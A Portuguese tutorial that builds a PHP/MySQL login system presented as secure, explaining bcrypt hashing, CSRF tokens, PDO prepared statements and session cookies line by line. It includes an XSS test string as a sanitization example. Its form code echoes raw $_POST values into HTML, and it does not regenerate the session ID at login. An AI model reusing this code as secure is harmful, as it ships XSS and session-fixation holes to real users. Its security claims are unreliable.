📚 Apostila Completa: Sistema de Login Seguro em PHP
Índice
1.	Introdução
2.	Arquitetura do Projeto
3.	Banco de Dados
4.	Configuração Inicial
5.	Classes Utilitárias
6.	Modelo de Dados
7.	Controllers
8.	Interface Pública
9.	Segurança Implementada
10.	Fluxo de Funcionamento
11.	Testando o Sistema
________________________________________
1. Introdução
Este projeto implementa um sistema de autenticação completo e seguro usando PHP puro (sem frameworks). O sistema inclui:
•	✅ Cadastro de usuários
•	✅ Login/Logout
•	✅ Área restrita (Dashboard)
•	✅ Proteção CSRF
•	✅ Sessões seguras
•	✅ Criptografia de senhas (Bcrypt)
•	✅ Logs de auditoria
•	✅ Validação de dados
Tecnologias Utilizadas
•	PHP 7.4+ (linguagem backend)
•	MySQL (banco de dados)
•	PDO (camada de abstração de banco)
•	Bcrypt (hash de senhas)
•	HTML5/CSS3 (frontend básico)
________________________________________
2. Arquitetura do Projeto
Padrão MVC Adaptado
┌─────────────┐      ┌──────────────┐      ┌─────────┐
│   VIEWS     │ ───> │ CONTROLLERS  │ ───> │ MODELS  │
│  (public/)  │ <─── │ (controllers)│ <─── │ (User)  │
└─────────────┘      └──────────────┘      └─────────┘
                            │
                            ▼
                     ┌─────────────┐
                     │  DATABASE   │
                     └─────────────┘
Separação de Responsabilidades
Camada	Responsabilidade
public/	Interface do usuário (HTML)
controllers/	Lógica de negócio e validação
models/	Acesso aos dados (CRUD)
utils/	Funções auxiliares (Segurança, Sessão)
config/	Configurações globais
________________________________________
3. Banco de Dados
3.1 Estrutura Completa
CREATE DATABASE IF NOT EXISTS sistema_login 
CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
Explicação linha por linha:
CREATE DATABASE IF NOT EXISTS sistema_login
•	CREATE DATABASE: comando para criar um novo banco
•	IF NOT EXISTS: evita erro se o banco já existir
•	sistema_login: nome do banco de dados
CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
•	CHARACTER SET utf8mb4: suporte completo a Unicode (incluindo emojis)
•	COLLATE utf8mb4_unicode_ci: regras de comparação case-insensitive
3.2 Tabela de Usuários
CREATE TABLE usuarios (
    id INT AUTO_INCREMENT PRIMARY KEY,
    nome VARCHAR(100) NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    senha_hash VARCHAR(255) NOT NULL,
    data_cadastro TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ultimo_login TIMESTAMP NULL,
    ativo TINYINT(1) DEFAULT 1,
    INDEX idx_email (email),
    INDEX idx_ativo (ativo)
) ENGINE=InnoDB;
Detalhamento dos campos:
Campo	Tipo	Propósito
id	INT AUTO_INCREMENT	Identificador único, incrementa automaticamente
nome	VARCHAR(100)	Nome do usuário (até 100 caracteres)
email	VARCHAR(255) UNIQUE	Email único (usado para login)
senha_hash	VARCHAR(255)	Hash bcrypt da senha (nunca armazena senha pura)
data_cadastro	TIMESTAMP	Data/hora do cadastro (automático)
ultimo_login	TIMESTAMP NULL	Data/hora do último acesso
ativo	TINYINT(1)	Status da conta (1=ativo, 0=inativo)
Índices:
INDEX idx_email (email),
•	Acelera buscas por email (usado no login)
INDEX idx_ativo (ativo)
•	Otimiza filtros por status ativo
Engine InnoDB:
•	Suporta transações ACID
•	Integridade referencial (foreign keys)
•	Melhor performance para operações de escrita
3.3 Tabela de Logs
CREATE TABLE logs_acesso (
    id INT AUTO_INCREMENT PRIMARY KEY,
    usuario_id INT,
    ip_address VARCHAR(45),
    user_agent TEXT,
    data_acesso TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    acao VARCHAR(50),
    sucesso TINYINT(1),
    FOREIGN KEY (usuario_id) REFERENCES usuarios(id) ON DELETE SET NULL
) ENGINE=InnoDB;
Explicação dos campos:
usuario_id INT,
•	Referência ao usuário (pode ser NULL se o usuário for deletado)
ip_address VARCHAR(45),
•	IP do cliente (45 caracteres suporta IPv6)
user_agent TEXT,
•	Informações do navegador/dispositivo
acao VARCHAR(50),
•	Tipo de ação: 'login', 'logout', 'login_failed'
sucesso TINYINT(1),
•	1 = sucesso, 0 = falha
FOREIGN KEY (usuario_id) REFERENCES usuarios(id) ON DELETE SET NULL
•	Chave estrangeira: vincula log ao usuário
•	ON DELETE SET NULL: se o usuário for deletado, o log permanece mas usuario_id vira NULL
3.4 Usuário de Exemplo
INSERT INTO usuarios (nome, email, senha_hash) VALUES 
('Usuário Exemplo', 'exemplo@email.com', '$2y$10$fMkIWhYAK0YFdqeDOktZdOFAOeo1c0WYcMYd9e3onDnSHdjY7keDG');
•	Hash bcrypt da senha "12345678"
•	Usado para testes iniciais do sistema
________________________________________
4. Configuração Inicial
4.1 Arquivo config.php
<?php
// Configurações de ambiente
define('ENVIRONMENT', 'production');
Explicação:
•	define(): cria uma constante global
•	ENVIRONMENT: controla se o sistema está em desenvolvimento ou produção
•	Em produção: erros não são exibidos ao usuário
// Configurações do banco
$host = 'localhost';
$usuario = 'root';
$senha = '';
$banco = 'sistema_login';
Credenciais do MySQL:
•	$host: servidor do banco (localhost = máquina local)
•	$usuario: usuário do MySQL (padrão: root)
•	$senha: senha do usuário (vazio no XAMPP/WAMP)
•	$banco: nome do banco de dados criado
// Incluir utilitários
require_once __DIR__ . '/../utils/Security.php';
require_once __DIR__ . '/../utils/Session.php';
Carregando dependências:
•	require_once: inclui arquivo uma única vez
•	__DIR__: diretório atual do arquivo config.php
•	/../utils/: sobe um nível e entra em utils/
// Iniciar sessão segura
Session::start();
•	Inicia a sessão PHP com configurações de segurança
•	Deve ser chamado antes de usar $_SESSION
4.2 Conexão PDO
try {
    $pdo = new PDO(
        "mysql:host=$host;dbname=$banco;charset=utf8mb4", 
        $usuario, 
        $senha, 
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES => false
        ]
    );
} catch(PDOException $e) {
    error_log("Erro de conexão: " . $e->getMessage());
    die("Erro no sistema. Tente novamente mais tarde.");
}
Linha por linha:
new PDO("mysql:host=$host;dbname=$banco;charset=utf8mb4", $usuario, $senha, [...]);
•	DSN (Data Source Name): string de conexão
•	mysql:: driver do MySQL
•	host=$host: servidor
•	dbname=$banco: banco de dados
•	charset=utf8mb4: encoding UTF-8 completo
Opções do PDO:
PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
•	Lança exceções em caso de erro (melhor para debug)
PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
•	Retorna resultados como array associativo
•	Exemplo: ['id' => 1, 'nome' => 'João']
PDO::ATTR_EMULATE_PREPARES => false
•	Usa prepared statements nativos do MySQL
•	Mais seguro contra SQL Injection
Tratamento de erro:
catch(PDOException $e) {
    error_log("Erro de conexão: " . $e->getMessage());
    die("Erro no sistema. Tente novamente mais tarde.");
}
•	error_log(): grava erro no log do servidor
•	die(): encerra script com mensagem genérica
•	Nunca expõe detalhes técnicos ao usuário final
4.3 Funções Auxiliares
function isLoggedIn() {
    return isset($_SESSION['user_id']) && !empty($_SESSION['user_id']);
}
Verifica se usuário está autenticado:
•	isset($_SESSION['user_id']): verifica se a chave existe
•	!empty($_SESSION['user_id']): verifica se não está vazia
•	Retorna true ou false
function requireLogin() {
    if (!isLoggedIn()) {
        $_SESSION['error'] = "Por favor, faça login para acessar esta página.";
        header('Location: ../public/login.php');
        exit();
    }
}
Protege páginas restritas:
•	Se não estiver logado, redireciona para login
•	header('Location: ...'): redireciona navegador
•	exit(): CRUCIAL - para execução do script
function debug($data) {
    if (ENVIRONMENT === 'development') {
        echo '<pre>';
        print_r($data);
        echo '</pre>';
    }
}
Função de debug:
•	Só funciona em ambiente de desenvolvimento
•	print_r(): exibe estrutura de arrays/objetos
•	<pre>: formata saída HTML
________________________________________
5. Classes Utilitárias
5.1 Classe Security
5.1.1 Sanitização de Entrada
public static function sanitizeInput($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}
Proteção contra XSS (Cross-Site Scripting):
trim($data)
•	Remove espaços em branco no início/fim
htmlspecialchars(..., ENT_QUOTES, 'UTF-8')
•	Converte caracteres especiais em entidades HTML
•	< vira &lt;
•	> vira &gt;
•	" vira &quot;
•	' vira &#039;
•	ENT_QUOTES: converte aspas simples e duplas
•	UTF-8: encoding utilizado
Exemplo prático:
$nome = "<script>alert('XSS')</script>";
$safe = Security::sanitizeInput($nome);
// Resultado: &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
5.1.2 Proteção CSRF
public static function generateCSRFToken() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}
Como funciona:
if (empty($_SESSION['csrf_token']))
•	Verifica se já existe um token na sessão
bin2hex(random_bytes(32))
- `random_bytes(32)`: gera 32 bytes aleatórios criptograficamente seguros
- `bin2hex()`: converte para hexadecimal (64 caracteres)
- **Resultado**: token único impossível de adivinhar

**Exemplo de token:**
a7f3c9e2b1d4f8a6c3e5d7b9f2a4c6e8d1b3f5a7c9e2b4d6f8a1c3e5d7b9f2a4
public static function verifyCSRFToken($token) {
    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}
Validação segura:
hash_equals($_SESSION['csrf_token'], $token)
•	Compara strings de forma segura
•	Evita timing attacks (análise do tempo de resposta)
•	Retorna true se forem idênticos
Por que CSRF é importante?
•	Previne que sites maliciosos executem ações em nome do usuário
•	Cada formulário tem um token único vinculado à sessão
5.1.3 Validações
public static function validateEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}
Validação de email:
•	filter_var(): função nativa do PHP
•	FILTER_VALIDATE_EMAIL: valida formato de email
•	Retorna o email se válido ou false
public static function validatePassword($password) {
    return strlen($password) >= 8;
}
Validação de senha:
•	Mínimo de 8 caracteres
•	Pode ser expandida (letras maiúsculas, números, símbolos)
public static function validateName($name) {
    return !empty($name) && strlen($name) >= 2 && strlen($name) <= 100;
}
Validação de nome:
•	Não pode estar vazio
•	Mínimo: 2 caracteres
•	Máximo: 100 caracteres
5.1.4 Sistema de Logs
public static function logAccess($pdo, $user_id, $action, $success) {
    try {
        $sql = "INSERT INTO logs_acesso (usuario_id, ip_address, user_agent, acao, sucesso) 
                VALUES (?, ?, ?, ?, ?)";
        $stmt = $pdo->prepare($sql);
        $stmt->execute([
            $user_id,
            $_SERVER['REMOTE_ADDR'],
            $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            $action,
            $success ? 1 : 0
        ]);
        return true;
    } catch(PDOException $e) {
        error_log("Erro ao registrar log: " . $e->getMessage());
        return false;
    }
}
Componentes do log:
$_SERVER['REMOTE_ADDR']
•	IP do cliente que fez a requisição
$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
•	Informações do navegador
•	??: operador null coalescing (PHP 7+)
•	Se não existir, usa 'Unknown'
$stmt->execute([...])
•	Prepared statement: previne SQL Injection
•	? são substituídos pelos valores do array
•	MySQL faz escape automático
5.2 Classe Session
5.2.1 Inicialização Segura
public static function start() {
    if (session_status() == PHP_SESSION_NONE) {
        session_set_cookie_params([
            'lifetime' => 0,
            'path' => '/',
            'domain' => '',
            'secure' => true,
            'httponly' => true,
            'samesite' => 'Strict'
        ]);
        session_start();
    }
}
Verificação de sessão:
if (session_status() == PHP_SESSION_NONE)
•	Verifica se a sessão já não foi iniciada
•	Evita erro "Session already started"
Configurações de cookie:
'lifetime' => 0
•	Cookie expira quando o navegador fecha
•	Segurança: sessão não persiste indefinidamente
'path' => '/'
•	Cookie válido para todo o site
'secure' => true
•	IMPORTANTE: cookie só enviado via HTTPS
•	Em desenvolvimento, mude para false
'httponly' => true
•	Proteção XSS: JavaScript não pode acessar o cookie
•	document.cookie não retorna o session ID
'samesite' => 'Strict'
•	Proteção CSRF: cookie não é enviado em requisições cross-site
•	Opções: Strict, Lax, None
5.2.2 Destruição de Sessão
public static function destroy() {
    $_SESSION = [];
    session_destroy();
    setcookie(session_name(), '', time() - 3600, '/');
}
Limpeza completa:
$_SESSION = [];
•	Limpa todas as variáveis de sessão
session_destroy();
•	Destroi a sessão no servidor
setcookie(session_name(), '', time() - 3600, '/');
•	session_name(): nome do cookie de sessão (geralmente PHPSESSID)
•	time() - 3600: data no passado (1 hora atrás)
•	Força navegador a deletar o cookie
5.2.3 Sistema de Flash Messages
public static function setFlash($type, $message) {
    $_SESSION['flash'][$type] = $message;
}
Armazena mensagem temporária:
•	$type: 'success', 'error', 'warning'
•	$message: texto da mensagem
public static function getFlash($type) {
    if (isset($_SESSION['flash'][$type])) {
        $message = $_SESSION['flash'][$type];
        unset($_SESSION['flash'][$type]);
        return $message;
    }
    return null;
}
Recupera e remove mensagem:
•	Padrão flash: mensagem é exibida uma única vez
•	unset(): remove da sessão após leitura
Uso prático:
// Definir mensagem
Session::setFlash('success', 'Cadastro realizado!');

// Recuperar na próxima página
$msg = Session::getFlash('success'); // Retorna a mensagem
$msg2 = Session::getFlash('success'); // Retorna null (já foi lida)
5.2.4 Gerenciamento de Usuário
public static function setUser($user) {
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['user_nome'] = $user['nome'];
    $_SESSION['user_email'] = $user['email'];
    $_SESSION['logged_in'] = true;
}
Armazena dados do usuário logado:
•	Copia informações relevantes para a sessão
•	logged_in: flag booleana de autenticação
public static function getUser() {
    return [
        'id' => $_SESSION['user_id'] ?? null,
        'nome' => $_SESSION['user_nome'] ?? null,
        'email' => $_SESSION['user_email'] ?? null
    ];
}
Recupera dados do usuário:
•	Retorna array com dados ou null
•	Útil para exibir nome do usuário logado
________________________________________
6. Modelo de Dados (User.php)
6.1 Estrutura da Classe
class User {
    private $pdo;
    
    public function __construct($pdo) {
        $this->pdo = $pdo;
    }
Padrão de injeção de dependência:
•	A conexão PDO é passada no construtor
•	$this->pdo: propriedade privada da classe
•	Permite reutilizar a mesma conexão
6.2 Buscar por Email
public function findByEmail($email) {
    $sql = "SELECT id, nome, email, senha_hash, ativo, data_cadastro, ultimo_login 
            FROM usuarios WHERE email = ?";
    $stmt = $this->pdo->prepare($sql);
    $stmt->execute([$email]);
    return $stmt->fetch();
}
Passo a passo:
$sql = "SELECT ... WHERE email = ?"
•	?: placeholder para prepared statement
•	Evita SQL Injection
$stmt = $this->pdo->prepare($sql);
•	Prepara a query
•	MySQL compila o comando
$stmt->execute([$email]);
•	Substitui ? pelo valor de $email
•	Faz escape automático
return $stmt->fetch();
•	Retorna uma linha como array associativo
•	Retorna false se não encontrar
Exemplo de retorno:
[
    'id' => 1,
    'nome' => 'João Silva',
    'email' => 'joao@email.com',
    'senha_hash' => '$2y$10$...',
    'ativo' => 1,
    'data_cadastro' => '2024-01-15 10:30:00',
    'ultimo_login' => '2024-01-20 14:25:00'
]
6.3 Buscar por ID
public function findById($user_id) {
    $sql = "SELECT id, nome, email, data_cadastro, ultimo_login 
            FROM usuarios WHERE id = ? AND ativo = 1";
    $stmt = $this->pdo->prepare($sql);
    $stmt->execute([$user_id]);
    return $stmt->fetch();
}
Diferenças importantes:
•	Não retorna senha_hash (não é necessário)
•	Filtra AND ativo = 1 (apenas usuários ativos)
•	Usado no dashboard (após login)
6.4 Criar Usuário
public function create($nome, $email, $senha_hash) {
    $sql = "INSERT INTO usuarios (nome, email, senha_hash) VALUES (?, ?, ?)";
    $stmt = $this->pdo->prepare($sql);
    return $stmt->execute([$nome, $email, $senha_hash]);
}
Inserção de registro:
•	INSERT INTO: adiciona novo registro
•	VALUES (?, ?, ?): três valores a serem inseridos
•	Retorna true em sucesso, false em falha
Campos automáticos:
•	id: AUTO_INCREMENT
•	data_cadastro: DEFAULT CURRENT_TIMESTAMP
•	ativo: DEFAULT 1
6.5 Atualizar Último Login
public function updateLastLogin($user_id) {
    $sql = "UPDATE usuarios SET ultimo_login = NOW() WHERE id = ?";
    $stmt = $this->pdo->prepare($sql);
    return $stmt->execute([$user_id]);
}
Atualização de timestamp:
•	NOW(): função MySQL que retorna data/hora atual
•	Chamado após login bem-sucedido
6.6 Verificar Email Existente
public function emailExists($email) {
    $sql = "SELECT id FROM usuarios WHERE email = ?";
    $stmt = $this->pdo->prepare($sql);
    $stmt->execute([$email]);
    return $stmt->fetch() !== false;
}
Validação de unicidade:
•	Busca apenas id (mais rápido)
•	!== false: converte resultado em booleano
•	Retorna true se email já existe
6.7 Histórico de Login
public function getLoginHistory($user_id, $limit = 10) {
    $sql = "SELECT acao, data_acesso, ip_address, sucesso 
            FROM logs_acesso 
            WHERE usuario_id = ? 
            ORDER BY data_acesso DESC 
            LIMIT ?";
    $stmt = $this->pdo->prepare($sql);
    $stmt->execute([$user_id, $limit]);
    return $stmt->fetchAll();
}
Busca múltiplos registros:
ORDER BY data_acesso DESC
•	Ordena do mais recente para o mais antigo
LIMIT ?
•	Limita quantidade de resultados
•	$limit = 10: valor padrão
return $stmt->fetchAll();
•	Retorna array de arrays
•	Cada linha é um elemento
Exemplo de retorno:
[
    ['acao' => 'login', 'data_acesso' => '2024-01-20 14:25:00', 'ip_address' => '192.168.1.1', 'sucesso' => 1],
    ['acao' => 'logout', 'data_acesso' => '2024-01-20 12:10:00', 'ip_address' => '192.168.1.1', 'sucesso' => 1],
    ['acao' => 'login_failed', 'data_acesso' => '2024-01-19 09:30:00', 'ip_address' => '192.168.1.5', 'sucesso' => 0]
]
________________________________________
7. Controllers
7.1 AuthController - Registro
function handleRegister($pdo) {
    // Verificar CSRF token
    if (!Security::verifyCSRFToken($_POST['csrf_token'] ?? '')) {
        Session::setFlash('error', "Token de segurança inválido.");
        header('Location: ../../public/cadastro.php');
        exit();
    }
Primeira linha de defesa:
•	Valida token CSRF antes de processar
•	$_POST['csrf_token'] ?? '': usa string vazia se não existir
•	Se falhar, redireciona com mensagem de erro
    $nome = Security::sanitizeInput($_POST['nome'] ?? '');
    $email = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
    $senha = $_POST['senha'] ?? '';
    $confirmar_senha = $_POST['confirmar_senha'] ?? '';
Captura e sanitização:
•	Security::sanitizeInput(): remove HTML/scripts
•	filter_var(..., FILTER_SANITIZE_EMAIL): limpa email
•	Senhas não são sanitizadas (podem conter caracteres especiais)
    // Validações
    $errors = [];
    
    if (!Security::validateName($nome)) {
        $errors[] = "Nome deve ter entre 2 e 100 caracteres.";
    }
    
    if (!Security::validateEmail($email)) {
        $errors[] = "Email inválido.";
    }
    
    if (!Security::validatePassword($senha)) {
        $errors[] = "Senha deve ter pelo menos 8 caracteres.";
    }
    
    if ($senha !== $confirmar_senha) {
        $errors[] = "Senhas não coincidem.";
    }
Validação em camadas:
•	Array $errors acumula mensagens
•	Valida todos os campos antes de processar
•	Usuário vê todos os erros de uma vez
    if (empty($errors)) {
        try {
            $userModel = new User($pdo);
            
            // Verificar se email já existe
            if ($userModel->emailExists($email)) {
                $errors[] = "Este email já está cadastrado.";
            } else {
                // Hash da senha
                $senha_hash = password_hash($senha, PASSWORD_DEFAULT);
Criptografia de senha:
password_hash($senha, PASSWORD_DEFAULT)
•	Bcrypt: algoritmo de hash seguro
•	PASSWORD_DEFAULT: usa o algoritmo mais seguro disponível
•	Gera hash diferente a cada execução (salt aleatório)
Exemplo:
Senha: "12345678"
Hash: $2y$10$fMkIWhYAK0YFdqeDOktZdOFAOeo1c0WYcMYd9e3onDnSHdjY7keDG
                // Inserir usuário
                if ($userModel->create($nome, $email, $senha_hash)) {
                    Session::setFlash('success', "Cadastro realizado com sucesso! Faça login.");
                    header('Location: ../../public/login.php');
                    exit();
                } else {
                    $errors[] = "Erro ao criar conta. Tente novamente.";
                }
            }
        } catch(PDOException $e) {
            error_log("Erro no cadastro: " . $e->getMessage());
            $errors[] = "Erro no sistema. Tente novamente.";
        }
    }
Tratamento de sucesso/erro:
•	Sucesso: redireciona para login com mensagem
•	Erro: loga detalhes, mostra mensagem genérica
    if (!empty($errors)) {
        Session::setFlash('error', implode('<br>', $errors));
        header('Location: ../../public/cadastro.php');
        exit();
    }
}
Exibição de erros:
•	implode('<br>', $errors): junta erros com quebra de linha
•	Flash message: mensagem temporária
7.2 AuthController - Login
function handleLogin($pdo) {
    // Verificar CSRF token
    if (!Security::verifyCSRFToken($_POST['csrf_token'] ?? '')) {
        Session::setFlash('error', "Token de segurança inválido.");
        header('Location: ../../public/login.php');
        exit();
    }
    
    $email = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
    $senha = $_POST['senha'] ?? '';
    
    // Validações básicas
    $errors = [];
    
    if (!Security::validateEmail($email)) {
        $errors[] = "Email inválido.";
    }
    
    if (empty($senha)) {
        $errors[] = "Senha é obrigatória.";
    }
Validação mínima:
•	Apenas verifica se campos foram preenchidos
•	Não revela se email existe (segurança)
    if (empty($errors)) {
        try {
            $userModel = new User($pdo);
            $usuario = $userModel->findByEmail($email);
            
            if ($usuario && password_verify($senha, $usuario['senha_hash'])) {
Verificação de credenciais:
$usuario = $userModel->findByEmail($email);
•	Busca usuário no banco
password_verify($senha, $usuario['senha_hash'])
- **Compara senha informada com hash armazenado**
- Extrai salt do hash e recalcula
- Retorna `true` se senha está correta

**Fluxo de verificação:**
Senha digitada: "12345678"
       ↓
password_verify()
       ↓
Hash armazenado: $2y$10$fMkI...
       ↓
Extrai salt → Recalcula hash → Compara
       ↓
true ou false
                if ($usuario['ativo'] == 1) {
                    // Login bem-sucedido
                    Session::setUser($usuario);
                    
                    // Atualizar último login
                    $userModel->updateLastLogin($usuario['id']);
                    
                    // Registrar log de sucesso
                    Security::logAccess($pdo, $usuario['id'], 'login', true);
                    
                    Session::setFlash('success', "Login realizado com sucesso!");
                    header('Location: ../../public/dashboard.php');
                    exit();
Processo de login bem-sucedido:
1.	Verificar se conta está ativa
   if ($usuario['ativo'] == 1)
2.	Criar sessão do usuário
   Session::setUser($usuario);
•	Armazena ID, nome e email na sessão
3.	Atualizar timestamp
   $userModel->updateLastLogin($usuario['id']);
4.	Registrar auditoria
   Security::logAccess($pdo, $usuario['id'], 'login', true);
5.	Redirecionar para dashboard
                } else {
                    $errors[] = "Conta desativada.";
                }
            } else {
                $errors[] = "Email ou senha incorretos.";
                
                // Registrar tentativa falha
                if ($usuario) {
                    Security::logAccess($pdo, $usuario['id'], 'login_failed', false);
                }
            }
Tratamento de falhas:
•	Conta desativada: mensagem específica
•	Credenciais incorretas: mensagem genérica 
o	Não revela se email existe (evita enumeração)
•	Log de tentativa falha: registra para auditoria
        } catch(PDOException $e) {
            error_log("Erro no login: " . $e->getMessage());
            $errors[] = "Erro no sistema. Tente novamente.";
        }
    }
    
    if (!empty($errors)) {
        Session::setFlash('error', implode('<br>', $errors));
        header('Location: ../../public/login.php');
        exit();
    }
}
Tratamento de exceções:
•	Erros técnicos não são expostos ao usuário
•	Mensagem genérica: "Erro no sistema"
•	Detalhes gravados no log do servidor
7.3 UserController - Atualizar Perfil
<?php
require_once '../config/config.php';
require_once '../models/User.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_GET['action'] ?? '';
    
    if ($action === 'update_profile' && isLoggedIn()) {
        handleUpdateProfile($pdo);
    }
}
Estrutura do controller:
if ($_SERVER['REQUEST_METHOD'] === 'POST')
•	Aceita apenas requisições POST
•	GET seria visível na URL (inseguro para ações)
$action = $_GET['action'] ?? '';
•	Define qual função executar
•	Exemplo: UserController.php?action=update_profile
if ($action === 'update_profile' && isLoggedIn())
•	Verifica se usuário está autenticado
•	Dupla verificação de segurança
function handleUpdateProfile($pdo) {
    // Verificar CSRF token
    if (!Security::verifyCSRFToken($_POST['csrf_token'] ?? '')) {
        Session::setFlash('error', "Token de segurança inválido.");
        header('Location: ../../public/dashboard.php');
        exit();
    }
    
    $user_id = $_SESSION['user_id'];
    $nome = Security::sanitizeInput($_POST['nome'] ?? '');
    
    // Validações
    $errors = [];
    
    if (!Security::validateName($nome)) {
        $errors[] = "Nome deve ter entre 2 e 100 caracteres.";
    }
Captura de dados:
•	$user_id: vem da sessão (não do POST)
•	Previne que usuário altere dados de outro
    if (empty($errors)) {
        try {
            $sql = "UPDATE usuarios SET nome = ? WHERE id = ?";
            $stmt = $pdo->prepare($sql);
            
            if ($stmt->execute([$nome, $user_id])) {
                $_SESSION['user_nome'] = $nome;
                Session::setFlash('success', "Perfil atualizado com sucesso!");
            } else {
                $errors[] = "Erro ao atualizar perfil.";
            }
Atualização no banco:
UPDATE usuarios SET nome = ? WHERE id = ?
•	Atualiza apenas o nome
•	WHERE id = ?: garante que só altera o usuário correto
$_SESSION['user_nome'] = $nome;
•	Importante: atualiza também a sessão
•	Evita ter que fazer logout/login
        } catch(PDOException $e) {
            error_log("Erro ao atualizar perfil: " . $e->getMessage());
            $errors[] = "Erro no sistema. Tente novamente.";
        }
    }
    
    if (!empty($errors)) {
        Session::setFlash('error', implode('<br>', $errors));
    }
    
    header('Location: ../../public/dashboard.php');
    exit();
}
?>
Sempre redireciona:
•	Mesmo com erro, volta para dashboard
•	Padrão PRG (Post-Redirect-Get)
•	Previne reenvio de formulário ao atualizar página
________________________________________
8. Interface Pública (Views)
8.1 Página Inicial (index.php)
<?php 
require_once '../src/config/config.php';

// Redirecionar para dashboard se já estiver logado
if (isLoggedIn()) {
    header('Location: dashboard.php');
    exit();
}
?>
Lógica de redirecionamento:
•	Usuário logado não precisa ver página inicial
•	Vai direto para área restrita
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistema de Login Seguro</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
Meta tags importantes:
<meta charset="UTF-8">
•	Suporte a acentuação e caracteres especiais
<meta name="viewport" content="width=device-width, initial-scale=1.0">
•	Responsivo para mobile
•	width=device-width: largura da tela do dispositivo
•	initial-scale=1.0: zoom inicial
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <h1>🔐 Sistema Seguro</h1>
                <p>Versão de Produção</p>
            </div>
            
            <?php
            // Mostrar mensagens flash
            $success = Session::getFlash('success');
            $error = Session::getFlash('error');
            
            if ($success): ?>
                <div class="alert alert-success">
                    <?php echo $success; ?>
                </div>
            <?php endif;
            
            if ($error): ?>
                <div class="alert alert-error">
                    <?php echo $error; ?>
                </div>
            <?php endif; ?>
Sistema de mensagens flash:
$success = Session::getFlash('success');
•	Recupera mensagem (se existir)
•	Remove da sessão automaticamente
if ($success): ?>
    <div class="alert alert-success">
        <?php echo $success; ?>
    </div>
<?php endif;
•	Sintaxe alternativa: if(): ... endif;
•	Mais legível quando mistura PHP e HTML
            <div class="actions">
                <a href="cadastro.php" class="btn btn-primary">Cadastrar</a>
                <a href="login.php" class="btn btn-secondary">Login</a>
            </div>
            
            <div class="security-info">
                <h3>⚠️ Sistema em Modo Produção</h3>
                <ul>
                    <li>Senhas criptografadas com Bcrypt</li>
                    <li>Proteção CSRF em todos os formulários</li>
                    <li>Sessões seguras com HttpOnly</li>
                    <li>Validação de entrada no servidor</li>
                    <li>Logs de auditoria de acesso</li>
                </ul>
            </div>
            
            <div class="demo-info">
                <p><strong>Usuário de demonstração:</strong></p>
                <p>Email: exemplo@email.com</p>
                <p>Senha: 12345678</p>
            </div>
        </div>
    </div>
</body>
</html>
Informações úteis:
•	Lista recursos de segurança
•	Credenciais de teste (apenas para demonstração)
8.2 Página de Cadastro (cadastro.php)
<?php 
require_once '../src/config/config.php';

if (isLoggedIn()) {
    header('Location: dashboard.php');
    exit();
}

$csrf_token = Security::generateCSRFToken();
?>
Preparação da página:
•	Redireciona se já está logado
•	Gera token CSRF para o formulário
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadastro - Sistema Seguro</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>📝 Cadastro Seguro</h1>
            
            <?php 
            $success = Session::getFlash('success');
            $error = Session::getFlash('error');
            
            if ($success): ?>
                <div class="alert alert-success">
                    <?php echo $success; ?>
                </div>
            <?php endif;
            
            if ($error): ?>
                <div class="alert alert-error">
                    <?php echo $error; ?>
                </div>
            <?php endif; ?>
Exibição de feedback:
•	Mostra mensagens de sucesso ou erro
•	Importante para UX (experiência do usuário)
            <form method="POST" action="../src/controllers/AuthController.php?action=register" class="form">
                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
Formulário seguro:
method="POST"
•	Dados não aparecem na URL
•	Mais seguro que GET
action="../src/controllers/AuthController.php?action=register"
•	Destino do formulário
•	?action=register: identifica a ação
<input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
•	Campo oculto com token CSRF
•	Enviado junto com outros dados
•	Validado no servidor
                <div class="form-group">
                    <label for="nome">Nome Completo:*</label>
                    <input type="text" id="nome" name="nome" required 
                           value="<?php echo $_POST['nome'] ?? ''; ?>"
                           minlength="2" maxlength="100"
                           placeholder="Seu nome completo">
                </div>
Campo de nome:
required
•	HTML5: valida no navegador antes de enviar
•	Não substitui validação no servidor
value="<?php echo $_POST['nome'] ?? ''; ?>"
•	Preserva valor digitado em caso de erro
•	Usuário não precisa redigitar
minlength="2" maxlength="100"
•	Validação HTML5 de tamanho
•	Também validado no servidor
placeholder="Seu nome completo"
•	Texto de exemplo no campo vazio
                <div class="form-group">
                    <label for="email">Email:*</label>
                    <input type="email" id="email" name="email" required
                           value="<?php echo $_POST['email'] ?? ''; ?>"
                           placeholder="seu@email.com">
                </div>
Campo de email:
type="email"
•	HTML5: valida formato de email no navegador
•	Teclado de email em dispositivos móveis
                <div class="form-group">
                    <label for="senha">Senha:* (mínimo 8 caracteres)</label>
